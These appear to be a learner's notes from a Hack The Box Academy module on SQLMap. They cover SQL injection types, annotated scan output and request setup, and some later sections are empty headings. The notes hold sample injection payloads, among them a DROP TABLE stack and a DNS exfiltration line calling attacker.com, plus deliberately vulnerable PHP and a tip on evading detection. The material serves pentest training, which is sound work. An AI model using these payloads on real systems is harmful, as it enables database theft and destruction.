---
tags:
  - HTB
  - MODULE
link: https://academy.hackthebox.com/app/module/58
description: The SQLMap Essentials module will teach you the basics of using SQLMap to discover various types of SQL Injection vulnerabilities, all the way to the advanced enumeration of databases to retrieve all data of interest.
---
## Summary

Most web applications these days are connected to a database at the backend that stores various types of data the web page needs to display, from user information to front end content.

It is very common for such web applications to improperly implement calls to the database, making it possible for an attacker to manipulate the HTTP requests sent to the server to trick the database into showing more data than the developers intended. This type of attack is called a SQL Injection (SQLi).

SQLMap is an automated tool specializing in automating SQL injection discovery and exploitation, making it very trivial for pentesters to discover and exploit SQL injection vulnerabilities.

In the `SQLMap Essentials` module, you will learn the basics of using SQLMap to discover various types of SQL injection vulnerabilities, all the way to advanced database enumeration and retrieval of interesting data.

In this module, we will cover:

- Overview and installation of SQLMap
- Different types of SQL Injection attacks supported by SQLMap, and where to use each
- Understanding the various output of SQLMap, to properly guide your attacks
- Attacking specific parts of a web application with the use of HTTP requests
- Dealing with various types of errors that we may be faced with when using SQLMap
- Using various SQLMap options to tune attacks to our specific needs
- Enumerating full databases and extracting the content of their tables, columns, and rows
- Advanced database enumeration to find specific data
- Finding usernames and passwords within databases and using SQLMap to crack them
- Bypassing various types of protections that may be in place to protect the web application against SQLMap
- Using SQLMap to read and write files to the remote server
- Using SQLMap to execute commands on the remote server and taking complete control over it

| SECTION/TASK | FLAG |
| ------------ | ---- |
|              |      |
|              |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Getting Started

### SQLMap Overview

[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

```shell
adampueman@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:
as:

| Target connection          | Injection detection | Fingerprinting                                         |
| :------------------------- | :------------------ | :----------------------------------------------------- |
| Enumeration                | Optimization        | Protection detection and bypass using "tamper" scripts |
| Database content retrieval | File system access  | Execution of the operating system (OS) commands        |
<div align="center">
<br>
<br>
</div>

#### SQLMap Installation

SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:

```shell
adampueman@htb[/htb]$ sudo apt install sqlmap
```

If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:

```shell
`adampueman@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
```

After that, SQLMap can be run with:

```shell
`adampueman@htb[/htb]$ python sqlmap.py`
```

<div align="center">
<br>
<br>
</div>

#### Supported Databases

SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|  |  |  |  |
| --- | --- | --- | --- |
| MySQL | Oracle | PostgreSQL | Microsoft SQL Server |
| SQLite | IBM DB2 | Microsoft Access | Firebird |
| Sybase | SAP MaxDB | Informix | MariaDB |
| HSQLDB | CockroachDB | TiDB | MemSQL |
| H2 | MonetDB | Apache Derby | Amazon Redshift |
| Vertica, Mckoi | Presto | Altibase | MimerSQL |
| CrateDB | Greenplum | Drizzle | Apache Ignite |
| Cubrid | InterSystems Cache | IRIS | eXtremeDB |
| FrontBase |  |  |  |

The SQLMap team also works to add and support new DBMSes periodically.
<div align="center">
<br>
<br>
</div>

#### Supported SQL Injection Types

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:

```shell
adampueman@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries
<div align="center">
<br>
<br>
</div>

#### Boolean-based blind SQL Injection

Example of `Boolean-based blind SQL Injection`:

```SQL
`AND 1=1`
```

SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the differentiation of `TRUE` from `FALSE` query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned `TRUE` or `FALSE`. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

- `TRUE` results are generally based on responses having none or marginal difference to the regular server response.
- `FALSE` results are based on responses having substantial differences from the regular server response.
- `Boolean-based blind SQL Injection` is considered as the most common SQLi type in web applications.
<div align="center">
<br>
<br>
</div>

#### Error-based SQL Injection

Example of `Error-based SQL Injection`:

```SQL
AND GTID_SUBSET(@@version,0)`
```

If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers `Error-based SQL Injection` for the following DBMSes:

|                      |            |         |
| -------------------- | ---------- | ------- |
| MySQL                | PostgreSQL | Oracle  |
| Microsoft SQL Server | Sybase     | Vertica |
| IBM DB2              | Firebird   | MonetDB |

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.
<div align="center">
<br>
<br>
</div>

#### UNION query-based

Example of `UNION query-based SQL Injection`:

```SQL
`UNION ALL SELECT 1,@@version,3`
```

With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.
<div align="center">
<br>
<br>
</div>

#### Stacked queries

Example of `Stacked Queries`:

```SQL
`; DROP TABLE users`
```

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.
<div align="center">
<br>
<br>
</div>

#### Time-based blind SQL Injection

Example of `Time-based blind SQL Injection`:

```SQL
`AND 1=IF(2>1,SLEEP(5),0)`
```

The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.

- `TRUE` response is generally characterized by the noticeable difference in the response time compared to the regular server response
- `FALSE` response should result in a response time indistinguishable from regular response times

`Time-based blind SQL Injection` is considerably slower than the boolean-based blind SQLi, since queries resulting in `TRUE` would delay the server response. This SQLi type is used in cases where `Boolean-based blind SQL Injection` is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. `INSERT`, `UPDATE` or `DELETE`), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as `Boolean-based blind SQL Injection` would not really work in this case.
<div align="center">
<br>
<br>
</div>

#### Inline queries

Example of `Inline Queries`:

```SQL
`SELECT (SELECT @@version) from`
```

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.
<div align="center">
<br>
<br>
</div>

#### Out-of-band SQL Injection

Example of `Out-of-band SQL Injection`:

```SQL
`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
```

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.
<div>
<br>
<br>
</div>

#### Questions

##### What's the fastest SQLi type?
==Answer==
<div align="center">
<br>
<br>
</div>

### Getting Started with SQLMap

Upon starting using SQLMap, the first stop for new users is usually the program's help message. To help new users, there are two levels of help message listing:

- `Basic Listing` shows only the basic options and switches, sufficient in most cases (switch `-h`):

```shell
adampueman@htb[/htb]$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
...SNIP...
```

- `Advanced Listing` shows all options and switches (switch `-hh`):

```shell
adampueman@htb[/htb]$ sqlmap -hh
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
...SNIP...
```

For more details, users are advised to consult the project's [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage), as it represents the official manual for SQLMap's usage.
<div align="center">
<br>
<br>
</div>

#### Basic Scenario

In a simple scenario, a penetration tester accesses the web page that accepts user input via a `GET` parameter (e.g., `id`). They then want to test if the web page is affected by the SQL injection vulnerability. If so, they would want to exploit it, retrieve as much information as possible from the back-end database, or even try to access the underlying file system and execute OS commands. An example SQLi vulnerable PHP code for this scenario would look as follows:

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

As error reporting is enabled for the vulnerable SQL query, there will be a database error returned as part of the web-server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tampering, as the resulting errors are easily recognized:

http://www.example.com/vuln.php?id=1

![Page with 'Lorem Ipsum' title, SQL error message, and explanation of Lorem Ipsum usage.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/58/rOrm8tC.png)

To run SQLMap against this example, located at the example URL `http://www.example.com/vuln.php?id=1`, would look like the following:

```shell
adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 22:26:45 /2020-09-09/

[22:26:45] [INFO] testing connection to the target URL
[22:26:45] [INFO] testing if the target URL content is stable
[22:26:46] [INFO] target URL content is stable
[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:26:46] [WARNING] reflective value(s) found and filtering out
[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
[22:26:46] [INFO] testing 'Generic inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
...SNIP...
[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[22:26:46] [INFO] testing 'MySQL inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       
...SNIP...
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:26:56] [INFO] target URL appears to have 3 columns in query
[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---
[22:26:56] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'

[*] ending @ 22:26:57 /2020-09-09/
```

> Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.

<div align="center">
<br>
<br>
</div>

### SQLMap Output Description

At the end of the previous section, the sqlmap output showed us a lot of info during its scan. This data is usually crucial to understand, as it guides us through the automated SQL injection process. This shows us exactly what kind of vulnerabilities SQLMap is exploiting, which helps us report what type of injection the web application has. This can also become handy if we wanted to manually exploit the web application once SQLMap determines the type of injection and vulnerable parameter.
<div align="center">
<br>
</div>

#### Log Messages Description

The following are some of the most common messages usually found during a scan of SQLMap, along with an example of each from the previous exercise and its description.

##### URL content is stable

`Log Message:`

- "target URL content is stable"

This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. While stability is important, SQLMap has advanced mechanisms to automatically remove the potential "noise" that could come from potentially unstable targets.

##### Parameter appears to be dynamic

`Log Message:`

- "GET parameter 'id' appears to be dynamic"

It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.

##### Parameter might be injectable

`Log Message:` "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. `?id=1",)..).))'`), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.

##### Parameter might be vulnerable to XSS attacks

`Log Message:`

- "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

While it is not its primary purpose, SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. In large-scale tests, where a lot of parameters are being tested with SQLMap, it is nice to have these kinds of fast heuristic checks, especially if there are no SQLi vulnerabilities found.

##### Back-end DBMS is '...'

`Log Message:`

- "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? Y/n"

In a normal run, SQLMap tests for all supported DBMSes. In case that there is a clear indication that the target is using the specific DBMS, we can narrow down the payloads to just that specific DBMS.

##### Level/risk values

`Log Message:`

- "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? Y/n"

If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests.  
This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.

##### Reflective values found

`Log Message:`

- "reflective value(s) found and filtering out"

Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.

##### Parameter appears to be injectable

`Log Message:`

- "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings.

Additionally, `with --string="luther"` indicates that SQLMap recognized and used the appearance of constant string value `luther` in the response for distinguishing `TRUE` from `FALSE` responses. This is an important finding because in such cases, there is no need for the usage of advanced internal mechanisms, such as dynamicity/reflection removal or fuzzy comparison of responses, which cannot be considered as false-positive.

##### Time-based comparison statistical model

`Log Message:`

- "time-based comparison requires a larger statistical model, please wait........... (done)"

SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.

##### Extending UNION query injection technique tests

`Log Message:`

- "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.

##### Technique appears to be usable

`Log Message:`

- "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

As a heuristic check for the UNION-query SQLi type, before the actual `UNION` payloads are sent, a technique known as `ORDER BY` is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required `UNION` columns by conducting the binary-search approach.

Note that this depends on the affected table in the vulnerable query.

##### Parameter is vulnerable

`Log Message:`

- "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? y/N"

This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. In the regular cases, the user may only want to find at least one injection point (i.e., parameter) usable against the target. However, if we were running an extensive test on the web application and want to report all potential vulnerabilities, we can continue searching for all vulnerable parameters.

##### Sqlmap identified injection points

`Log Message:`

- "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).

##### Data logged to text files

`Log Message:`

- "fetched data logged to text files under '/home/user/.sqlmap/output/[www.example.com](http://www.example.com/)'"

This indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case, `www.example.com`. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files. This means that SQLMap tries to reduce the required target requests as much as possible, depending on the session files' data.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Building Attacks

### Running SQLMap on an HTTP Request

SQLMap has numerous options and switches that can be used to properly set up the (HTTP) request before its usage.

In many cases, simple mistakes such as forgetting to provide proper cookie values, over-complicating setup with a lengthy command line, or improper declaration of formatted POST data, will prevent the correct detection and exploitation of the potential SQLi vulnerability.
<div align="center">
<br>
</div>

#### Curl Commands

One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools:

![Network panel showing a GET request to www.example.com with a 404 status, and a context menu with options like 'Copy as cURL'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/58/M5UVR6n.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:

```shell
adampueman@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).
<div align="center">
<br>
<br>
</div>

#### GET/POST Requests

In the most common scenario, `GET` parameters are provided with the usage of option `-u`/`--url`, as in the previous example. As for testing `POST` data, the `--data` flag can be used, as follows:

```shell
`adampueman@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
```

In such cases, `POST` parameters `uid` and `name` will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special marker `*` as follows:

```shell
`adampueman@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`
```

<div align="center">
<br>
<br>
</div>

#### Full HTTP Requests

If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the `-r` flag. With this option, SQLMap is provided with the "request file," containing the whole HTTP request inside a single textual file. In a common scenario, such HTTP request can be captured from within a specialized proxy application (e.g. `Burp`) and written into the request file, as follows:

![HTTP GET request to www.example.com with headers including User-Agent and Accept-Language.|1078](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/58/x7ND6VQ.png)

An example of an HTTP request captured with `Burp` would look like:

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

We can either manually copy the HTTP request from within `Burp` and write it to a file, or we can right-click the request within `Burp` and choose `Copy to file`. Another way of capturing the full HTTP request would be through using the browser, as mentioned earlier in the section, and choosing the option `Copy` > `Copy Request Headers`, and then pasting the request into a file.

To run SQLMap with an HTTP request file, we use the `-r` flag, as follows:

```shell
adampueman@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 14:32:59 /2020-09-11/

[14:32:59] [INFO] parsing HTTP request from 'req.txt'
[14:32:59] [INFO] testing connection to the target URL
[14:32:59] [INFO] testing if the target URL content is stable
[14:33:00] [INFO] target URL content is stable
```

> Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.

<div align="center">
<br>
<br>
</div>

#### Custom SQLMap Requests

If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.

For example, if there is a requirement to specify the (session) cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option `--cookie` would be used as follows:

```shell
adampueman@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of option `-H/--header`:

```shell
adampueman@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

We can apply the same to options like `--host`, `--referer`, and `-A/--user-agent`, which are used to specify the same HTTP headers' values.

Furthermore, there is a switch `--random-agent` designed to randomly select a `User-agent` header value from the included database of regular browser values. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (e.g. `User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)`). Alternatively, the `--mobile` switch can be used to imitate the smartphone by using that same header value.

While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. `--cookie="id=1*"`). The same principle applies to any other part of the request.

Also, if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`, as follows:

```shell
adampueman@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```
<div align="center">
<br>
<br>
</div>

#### Custom HTTP Requests

Apart from the most common form-data `POST` body style (e.g. `id=1`), SQLMap also supports JSON formatted (e.g. `{"id":1}`) and XML formatted (e.g. `<element><id>1</id></element>`) HTTP requests.

Support for these formats is implemented in a "relaxed" manner; thus, there are no strict constraints on how the parameter values are stored inside. In case the `POST` body is relatively simple and short, the option `--data` will suffice.

However, in the case of a complex or long POST body, we can once again use the `-r` option:

shell
`adampueman@htb[/htb]$ cat req.txt HTTP / HTTP/1.0 Host: www.example.com {   "data": [{    "type": "articles",    "id": "1",    "attributes": {      "title": "Example JSON",      "body": "Just an example",      "created": "2020-05-22T14:56:29.000Z",      "updated": "2020-05-22T14:56:28.000Z"    },    "relationships": {      "author": {        "data": {"id": "42", "type": "user"}      }    }  }] }`

shell
`adampueman@htb[/htb]$ sqlmap -r req.txt         ___       __H__ ___ ___[(]_____ ___ ___  {1.4.9} |_ -| . [)]     | .'| . | |___|_  [']_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 00:03:44 /2020-09-15/ [00:03:44] [INFO] parsing HTTP request from 'req.txt' JSON data found in HTTP body. Do you want to process it? [Y/n/q]  [00:03:45] [INFO] testing connection to the target URL [00:03:45] [INFO] testing if the target URL content is stable [00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic [00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic [00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable`
<div align="center">
<br>
<br>
</div>

### Handling SQLMap Errors
<div align="center">
<br>
<br>
</div>

### Attack Tuning
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Database Enumeration

### Database Enumeration
<div align="center">
<br>
<br>
</div>

